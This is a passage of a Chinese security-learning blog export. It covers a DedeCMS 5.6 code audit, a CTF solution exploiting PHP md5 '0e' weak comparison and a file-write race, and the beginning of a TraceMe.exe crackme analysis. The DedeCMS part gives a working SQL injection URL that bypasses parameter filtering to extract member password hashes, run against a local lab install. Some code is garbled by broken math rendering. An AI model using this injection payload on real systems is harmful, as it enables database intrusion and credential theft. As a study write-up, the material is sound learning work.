<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image080.jpg" alt="img" style="zoom:80%;">
<p>查看mchStrcode的代码，如下图</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image082.jpg" alt="img" style="zoom:80%;">
<p>这里</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo>=</mo><mi>s</mi><mi>u</mi><mi>b</mi><mi>s</mi><mi>t</mi><mi>r</mi><mo stretchy="false">(</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">key  = substr(md5(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault">b</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span></span></span></span>_SERVER[“HTTP_USER_AGENT”].$GLOBALS[‘cfg_cookie_encode’]),8,18);</p>
<p>可以知道这个代码将 $_SERVER[“HTTP_USER_AGENT”] 和 $GLOBALS[‘cfg_cookie_encode’] 进行拼接，然后进行md5计算之后取前 18 位字符，其中的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mrow></mrow><mi>S</mi></msub><mi>E</mi><mi>R</mi><mi>V</mi><mi>E</mi><mi>R</mi><mo stretchy="false">[</mo><mi mathvariant="normal">&quot;</mi><mi>H</mi><mi>T</mi><mi>T</mi><msub><mi>P</mi><mi>U</mi></msub><mi>S</mi><mi>E</mi><msub><mi>R</mi><mi>A</mi></msub><mi>G</mi><mi>E</mi><mi>N</mi><mi>T</mi><mi mathvariant="normal">&quot;</mi><mo stretchy="false">]</mo><mi mathvariant="normal">是</mi><mi mathvariant="normal">浏</mi><mi mathvariant="normal">览</mi><mi mathvariant="normal">器</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">标</mi><mi mathvariant="normal">识</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">知</mi><mi mathvariant="normal">道</mi></mrow><annotation encoding="application/x-tex">_SERVER[&quot;HTTP_USER_AGENT&quot;] 是浏览器的标识，我们可以控制这个，如果我们知道</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05764em;">S</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">[</span><span class="mord">&quot;</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">U</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord">&quot;</span><span class="mclose">]</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">浏</span><span class="mord cjk_fallback">览</span><span class="mord cjk_fallback">器</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">识</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span></span></span></span>GLOBALS[‘cfg_cookie_encode’])怎么生成的话就可以知道key值了</p>
<p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>G</mi><mi>L</mi><mi>O</mi><mi>B</mi><mi>A</mi><mi>L</mi><mi>S</mi><msup><mo stretchy="false">[</mo><mo mathvariant="normal">′</mo></msup><mi>c</mi><mi>f</mi><msub><mi>g</mi><mi>c</mi></msub><mi>o</mi><mi>o</mi><mi>k</mi><mi>i</mi><msub><mi>e</mi><mi>e</mi></msub><mi>n</mi><mi>c</mi><mi>o</mi><mi>d</mi><msup><mi>e</mi><mo mathvariant="normal">′</mo></msup><mo stretchy="false">]</mo><mo stretchy="false">)</mo><mi mathvariant="normal">实</mi><mi mathvariant="normal">际</mi><mi mathvariant="normal">上</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">GLOBALS[&#x27;cfg_cookie_encode&#x27;])实际上是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault">G</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault">A</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mopen"><span class="mopen">[</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">i</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">n</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span><span class="mord cjk_fallback">实</span><span class="mord cjk_fallback">际</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">是</span></span></span></span>rnd_cookieEncode</p>
<p>$rnd_cookieEncode = chr(mt_rand(ord(‘A’),ord(‘Z’))).chr(mt_rand(ord(‘a’),ord(‘z’))).chr(mt_rand(ord(‘A’),ord(‘Z’))).chr(mt_rand(ord(‘A’),ord(‘Z’))).chr(mt_rand(ord(‘a’),ord(‘z’))).mt_rand(1000,9999).chr(mt_rand(ord(‘A’),ord(‘Z’)));</p>
<p>可以看到$rnd_cookieEncode所有密匙数为26^6*(9999-1000)=2779933068224，虽然可以暴力破解，但是时间成本太高</p>
<h3 id="攻击思路"><a class="markdownIt-Anchor" href="#攻击思路"></a> 攻击思路</h3>
<p>虽然cfg_cookie_encode的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，感觉不太值得。所以想法是在什么地方可以使用 mchStrCode 加密可控参数，并且能够返回到页面中。所以搜索一下全文哪里调用了这个函数。</p>
<p><strong>在member /buy_action.php中有一个加密调用如下</strong></p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image084.jpg" alt="img" style="zoom:80%;">
<p>这下面有一句tpl-&gt;LoadTemplate(DEDEMEMBER.’/templets/buy_action_payment.htm’);</p>
<p>在/templets/buy_action_payment.htm这个文件中，可以看到会回显我们之前加密的 $pr_encode 和 $pr_verify</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image086.jpg" alt="img" style="zoom:80%;">
<p>通过这个代码，如果我们提交的是“cfg_dbprefix=SQL注入”的值，就可以从而获取相应的 pr_encode 和 pr_verify</p>
<p>但是在common.inc.php中会过滤提交的以cfg、GLOBALS、GET、POST、COOKIE 开头的值</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/Users\17473\Desktop\博客\红日安全[代码审计]3则\clip_image088.jpg" alt="img" style="zoom:80%;">
<p>这个问题的解决就利用到了 $REQUEST 内容与 parse_str 函数内容的差异特性。我们url传入的时候通过**[a=1&amp;b=2%26c=3]这样的提交时， $REQUEST 解析的内容就是 [a=1，b=2%26c=3] 。而通过上面代码的遍历进入 parse_str 函数的内容则是 [a=1&amp;b=2&amp;c=3] ，因为 parse_str 函数会针对传入进来的数据进行解码，所以解析后的内容就变成了[a=1，b=2，c=3]**。所以可以通过这种方法绕过 common.inc.php 文件对于参数内容传递的验证。</p>
<p>例如构造&amp;a=1%26cfg_dbprefix</p>
<h3 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h3>
<p>访问 buy_action.php使用参数如下</p>
<p>product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@’/!12345union/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23</p>
<p>所以构造url如下</p>
<p><a href="http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php?product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation">http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php?product=card&amp;pid=1&amp;a=1%26cfg_dbprefix=dede_member_operation</a> WHERE 1=@’/!12345union/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image090.jpg" alt="img" style="zoom:80%;">
<p>然后抓包在进行发送，得到pr_encode 和 pr_verify的值</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image092.jpg" alt="img" style="zoom:80%;">
<p>这里我得到</p>
<p>pd_encode=“QBYKUkVSElkABEcHQ0RQU1gJFgVYBxZSAAM8AVcTF1FfXh0FVAEBU29cAwkBAEc8CkRcRQRMWQsLFmd5IzYmRQReJRMWFlQKA1BQQ15YCQpMRUYGCVFaQ0UJHFZJBRwFSlFPUxlUSQwVDkkJAEQjZH98RkwwIHkmJmAZdCptfjBNHxxyKSogJGFLRRxqcil9czBFRkdVRiIxKnhDAVFdUjpVVQkHU0IRKi0uLGFDVRgIHkl+fCsqZBhjJyonTQVKVx0QT0V+YisoFnl/ICsxKHQ3LHt3aDZ7eCEodx5yLiUxJHY3IGZmZCBsY0QiZH9kNkQhPBUbTFUZFA”</p>
<p>pd_verify =“de99a6f6445b0a8d931f7b5a99f2cee9”</p>
<p>所以构造的payload为http://127.0.0.1/DedeCmsV5.6-UTF8-Final/uploads/member/buy_action.php? buy_action.php?pd_encode=QBYKUkVSElkABEcHQ0RQU1gJFgVYBxZSAAM8AVcTF1FfXh0FVAEBU29cAwkBAEc8CkRcRQRMWQsLFmd5IzYmRQReJRMWFlQKA1BQQ15YCQpMRUYGCVFaQ0UJHFZJBRwFSlFPUxlUSQwVDkkJAEQjZH98RkwwIHkmJmAZdCptfjBNHxxyKSogJGFLRRxqcil9czBFRkdVRiIxKnhDAVFdUjpVVQkHU0IRKi0uLGFDVRgIHkl+fCsqZBhjJyonTQVKVx0QT0V+YisoFnl/ICsxKHQ3LHt3aDZ7eCEodx5yLiUxJHY3IGZmZCBsY0QiZH9kNkQhPBUbTFUZFA&amp;pd_verify= de99a6f6445b0a8d931f7b5a99f2cee9</p>
<h3 id="ctf题目-3"><a class="markdownIt-Anchor" href="#ctf题目-3"></a> CTF题目</h3>
<p>源码：</p>
<p>uploadsomething.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$referer</span>)!== <span class="hljs-literal">false</span>) &#123;<br>  <span class="hljs-variable">$savepath</span> = <span class="hljs-string">&quot;uploads/&quot;</span> . sha1(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span>;<br>  <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$savepath</span>)) &#123;<br>    <span class="hljs-variable">$oldmask</span> = umask(<span class="hljs-number">0</span>);<br>    mkdir(<span class="hljs-variable">$savepath</span>, <span class="hljs-number">0777</span>);<br>    umask(<span class="hljs-variable">$oldmask</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;  by:l1nk3r&#x27;</span>;<br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;<br>    usleep(<span class="hljs-number">100000</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;<br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br>  &#125;<br>  <span class="hljs-keyword">print</span> &lt;&lt;&lt;EOT<br>&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;get&quot;</span>&gt;<br>&lt;div class=&quot;form-group&quot;&gt;<br>&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputEmail1&quot;</span>&gt;Filename&lt;/label&gt;<br>&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;filename&quot; id=&quot;exampleInputEmail1&quot; placeholder=&quot;Filename&quot;&gt;<br>&lt;/div&gt;a<br>&lt;div class=&quot;form-group&quot;&gt;<br>&lt;label <span class="hljs-keyword">for</span>=<span class="hljs-string">&quot;exampleInputPassword1&quot;</span>&gt;Content&lt;/label&gt;<br>&lt;input type=&quot;text&quot; class=&quot;form-control&quot; name=&quot;content&quot; id=&quot;exampleInputPassword1&quot; placeholder=&quot;Contont&quot;&gt;<br>&lt;/div&gt;<br>&lt;button type=&quot;submit&quot; class=&quot;btn btn-default&quot;&gt;Submit&lt;/button&gt;<br>&lt;/form&gt;<br>EOT;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you can not see this page&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
<p>Index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;hongri&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>@parse_str(<span class="hljs-variable">$id</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; md5(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == md5(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;uploadsomething.php&quot;&gt;flag is here&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>访问主页，没什么显示的内容</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image094.gif" alt="img" style="zoom:80%;">
<p>查看源码发现这里有一处md5比较</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image096.gif" alt="img" style="zoom:80%;">
<p>如果正确就会打印出flag的地址，这里使用的是==比较，是弱类型比较，其中有一个漏洞是</p>
<p>当字符串的开始没有以合法的数值开始，在进行判断时，其值为0</p>
<p>var_dump(“0e123456”==“0e99999”); //true</p>
<p>而且本题这里QNKCDZO的md5值为0E830400451993494058024219903391开头是0e，所以只要用另一个0e开头的md5值和它比较，就可以通过了，这里使用了s155964671a，md5值为0e342768416822451524974117254469，构建payload为?id=a[0]=s155964671a</p>
<p>通过验证，显示出flag的页面</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image098.gif" alt="img" style="zoom:80%;">
<p>注意这里有一段代码会验证referer</p>
<p>$referer = $_SERVER[‘HTTP_REFERER’];</p>
<p>if(isset($referer)!== false)</p>
<p>如果不带referer进行访问，就会出现这个界面</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image100.gif" alt="img" style="zoom:80%;">
<p>进入flag的页面如下</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image102.gif" alt="img" style="zoom:80%;">
<p>这里如果发送了filename和content的数据就会回显一个flag的地址，但是不知道是不是我环境搭的不对，我这里不会显示，但是这里这个文件夹确实建立了，然后flag也在里面</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image104.gif" alt="img" style="zoom:80%;">
<p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image106.gif" alt="img" style="zoom:80%;"> <img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image108.gif" alt="img" style="zoom:80%;"></p>
<p>然后观察uploadsomething.php有这段</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) &amp;&amp; (@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">//$fp = fopen(&quot;$savepath&quot;.$_GET[&#x27;filename&#x27;], &#x27;w&#x27;);</span><br><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;HRCTF&#123;y0u_n4ed_f4st&#125;  by:l1nk3r&#x27;</span>;<br><br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br><br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;Flag is here,come on~ &#x27;</span> . <span class="hljs-variable">$savepath</span> . htmlspecialchars(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]) . <span class="hljs-string">&quot;&quot;</span>;<br><br>    usleep(<span class="hljs-number">100000</span>);<br><br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Too slow!&quot;</span>;<br><br>    file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$savepath</span>&quot;</span> . <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>], <span class="hljs-variable">$content</span>);<br><br>  &#125;<br></code></pre></td></tr></table></figure>
<p>里面的usleep(100000);会限制时间，过了之后就会把flag覆盖并且写入Too slow</p>
<p>所以我们必须在flag消失之前访问</p>
<p>使用burpsuite抓包，然后进行连续发送</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image110.gif" alt="img" style="zoom:80%;">
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image112.gif" alt="img" style="zoom:80%;">
<p>这里设置了发送2000个包，开始攻击，在攻击的时候访问http://192.168.44.3/day7/uploads/42df680fe50964852a5d21b069107fc06b22cd4d/flag即可</p>
<p>这里成功拿到了flag</p>
<img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image114.gif" alt="img" style="zoom:80%;">
</#%;></p>]]></content>
      <categories>
        <category>web学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>web学习</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向TraceMe.exe</title>
    <url>/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/</url>
    <content><![CDATA[<h1 id="逆向tracemeexe"><a class="markdownIt-Anchor" href="#逆向tracemeexe"></a> 逆向TraceMe.exe</h1>
<p>首先我们得找到关键函数，就是关键跳，修改后能够直接破解成功的步骤，我们知道这个程序是有对话框的，所以我们在window的对话框api上下断点</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image002.jpg" alt="img" style="zoom:80%;">
<p>首先尝试随便输入用户名和序列号</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image004.jpg" alt="img" style="zoom:80%;">
<p>可以看到这个时候触发了断点在0x75D4E290处</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image006.jpg" alt="img" style="zoom:80%;">
<p>直接使用f9跳转到返回的地方，跳过一些api函数后，这里这两个我认为应该都是读取对话框的函数。</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image008.jpg" alt="img" style="zoom:80%;">
<p>我们继续单步运行，这里注意到，当运行到图中所示地址时，eax和edx就出现了我们输入的内容</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image010.jpg" alt="img" style="zoom:80%;">
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image012.jpg" alt="img" style="zoom:80%;">
<p>之后会call 401340这个函数，我认为这个是一个关键函数</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image014.jpg" alt="img" style="zoom:80%;">
<p>经过调试分析，这个函数的大概逻辑如下</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image016.jpg" alt="img" style="zoom:80%;">
<p>0x405030的地方存储的数值如下</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image018.jpg" alt="img" style="zoom:80%;">
<p>继续运行，可以看到ecx=7的时候就跳出了这个循环</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image020.jpg" alt="img" style="zoom:80%;">
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image022.jpg" alt="img" style="zoom:80%;">
<p>执行完之后，貌似得到2675，可能是密钥值，因为之后的函数把string2“ebp：2675“和string1”abcdefg“进行比较了</p>
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image024.jpg" alt="img" style="zoom:80%;">
<img src="/2021/05/20/%E9%80%86%E5%90%91TraceMe-exe/clip_image026.jpg" alt="img" style="zoom:80%;">
